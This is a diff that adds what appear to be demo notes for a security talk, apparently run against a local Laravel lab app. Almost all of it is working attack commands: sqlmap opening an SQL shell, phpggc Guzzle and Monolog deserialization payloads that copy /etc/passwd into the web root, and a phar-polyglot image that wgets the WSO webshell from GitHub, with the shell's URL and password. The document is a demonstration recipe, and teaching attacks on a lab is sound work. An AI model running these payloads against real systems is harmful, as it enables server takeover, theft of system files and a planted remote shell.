@@ -1,0 +1,38 @@
+
+
+
+
+
+cd /home/liam/Projects/talks/hackthesystem/tools/sqlmap-dev
+
+./sqlmap.py  --purge
+
+./sqlmap.py -u "http://localhost:9999/mysql?title=pride&year=1810" --sql-shell
+
+SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES
+
+
+-----
+
+cd /home/liam/Projects/talks/hackthesystem/tools/phpggc
+
+./phpggc Guzzle/RCE1 system "cat /etc/passwd > ../../../public/passwd" > payload
+
+mv payload ../../laravel/app/Http/Controllers/
+
+URLS:
+http://localhost:9999/rce/payload
+http://localhost:9999/passwd
+
+------
+
+cd /home/liam/Projects/talks/hackthesystem/tools/phpggc
+
+./phpggc -pj avatar.jpg Monolog/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php -O wso.php" -o loaded-mono.jpg
+
+mv loaded-mono.jpg ../../laravel/app/Http/Controllers/
+
+
+URLS:
+http://localhost:9999/image?filename=phar://loaded-mono.jpg
+http://localhost:9999/wso.php / PW ghost287
